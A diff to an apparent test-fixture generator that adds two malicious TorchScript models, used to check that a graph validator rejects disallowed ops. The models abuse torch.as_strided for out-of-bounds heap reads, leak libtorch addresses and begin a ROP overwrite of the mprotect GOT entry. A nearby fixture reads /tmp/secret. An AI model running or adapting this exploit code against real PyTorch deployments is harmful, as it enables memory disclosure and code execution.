@@ -106,6 +106,115 @@ class _FileReaderChild(torch.nn.Module):
         return torch.from_file("/tmp/secret", size=10)
 
 
+# --- Sandbox2 attack models (PR #2873) ---
+#
+# These reproduce real-world attack vectors that exploit torch.as_strided
+# to leak heap addresses and build ROP chains.  The graph validator must
+# reject them because as_strided (and several helper ops) are not in the
+# transformer-architecture allowlist.
+
+
+class HeapLeakModel(torch.nn.Module):
+    """Leaks heap addresses via torch.as_strided with a malicious storage offset.
+
+    The attack scans the heap for libtorch pointers by reading out-of-bounds
+    memory through a strided view.  Key unrecognised ops: aten::as_strided,
+    aten::item, aten::__rshift__.
+    """
+    def find_heap_overlap(self, tensors: Tensor) -> tuple[list[int], Tensor]:
+        evil_length = 0x900 * 8
+        leak = torch.as_strided(
+            tensors, [evil_length], [1], 2305843009213693952 - evil_length)
+        index: list[int] = [-1]
+        for i in range(evil_length - 1 - 5, -1, -1):
+            if (leak[i + 3].item() == leak[i + 5].item()
+                    and leak[i + 3].item() >> 40 == 127):
+                if (leak[i + 2].item() >= 0x100000000
+                        and leak[i + 2].item() <= 0x100000005):
+                    index.append(i)
+        return (index, leak)
+
+    def forward(self, a: Tensor, b: Tensor, c: Tensor, d: Tensor) -> Tensor:
+        tmp: list[Tensor] = []
+        heap_len = 200
+        array_len = 0x900
+        for i in range(heap_len):
+            tmp_values = [0xdead00000 + i] + [
+                0xdead00000 + j for j in range(2, array_len)]
+            tmp.append(torch.tensor(tmp_values))
+        for i in range(heap_len):
+            indexs, leak = self.find_heap_overlap(tmp[i])
+            indexs = indexs[1:]
+            if indexs == []:
+                continue
+            for index in indexs:
+                heap_addr = leak[index + 3].item()
+                libtorch_python_addr = leak[index + 1].item()
+                libtorch_cpu_addr = libtorch_python_addr - 0xc878b50
+                assert 1 == 0, "leak: " + hex(libtorch_cpu_addr)
+        for i in range(heap_len):
+            print(tmp[i].shape)
+        return torch.zeros(0)
+
+
+class RopExploitModel(torch.nn.Module):
+    """Builds a ROP chain to mprotect heap memory and execute shellcode.
+
+    Extends the heap-leak technique to overwrite function pointers and
+    chain gadgets that call mprotect followed by attacker-controlled
+    shellcode that writes files to disk.  Key unrecognised ops:
+    aten::as_strided, aten::copy_, aten::Delete.
+    """
+    def find_heap_overlap(self, tensors: Tensor) -> tuple[list[int], Tensor]:
+        evil_length = 0x900 * 8
+        leak = torch.as_strided(
+            tensors, [evil_length], [1], 2305843009213693952 - evil_length)
+        index: list[int] = [-1]
+        for i in range(evil_length - 1 - 5, -1, -1):
+            if (leak[i + 3].item() == leak[i + 5].item()
+                    and leak[i + 3].item() >> 40 == 127):
+                if (leak[i + 2].item() >= 0x100000000
+                        and leak[i + 2].item() <= 0x100000005):
+                    index.append(i)
+        return (index, leak)
+
+    def get_address_data(self, leak: Tensor, index: int,
+                         tmp: list[Tensor], target_addr: int) -> int:
+        leak[index] = target_addr
+        return int(tmp[0].item())
+
+    def forward(self, a: Tensor, b: Tensor, c: Tensor, d: Tensor) -> Tensor:
+        tmp: list[Tensor] = []
+        heap_len = 200
+        array_len = 0x900
+        for i in range(heap_len):
+            tmp_values = [0xdead00000 + i] + [
+                0xdead00000 + j for j in range(2, array_len)]
+            tmp.append(torch.tensor(tmp_values))
+        for i in range(heap_len):
+            indexs, leak = self.find_heap_overlap(tmp[i])
+            indexs = indexs[1:]
+            if indexs == []:
+                continue
+            for index in indexs:
+                heap_addr = leak[index + 3].item()
+                libtorch_python_addr = leak[index + 1].item()
+                libtorch_cpu_addr = libtorch_python_addr - 0xc878b50
+                leak[index + 3] = int(heap_addr - 0x8)
+                for j in range(heap_len):
+                    if tmp[j][2].item() == 0xDEAD00002 and i != j:
+                        mprotect_got_addr = 0xc9785f0 + libtorch_cpu_addr
+                        self.get_address_data(
+                            leak, index + 3, tmp[j:j + 1],
+                            int(mprotect_got_addr))
+                        del tmp[j]
+                        assert 1 == 0, "exploit"
+                        return torch.zeros(0)
+        for i in range(heap_len):
+            print(tmp[i].shape)
+        return torch.zeros(0)
+
+
 # --- Generation logic ---
 
 
@@ -116,6 +225,8 @@ MODELS = {
     "malicious_conditional.pt": ConditionalMalicious,
     "malicious_many_unrecognised.pt": ManyUnrecognisedOps,
     "malicious_file_reader_in_submodule.pt": FileReaderInSubmodule,
+    "malicious_heap_leak.pt": HeapLeakModel,
+    "malicious_rop_exploit.pt": RopExploitModel,
 }
 
 
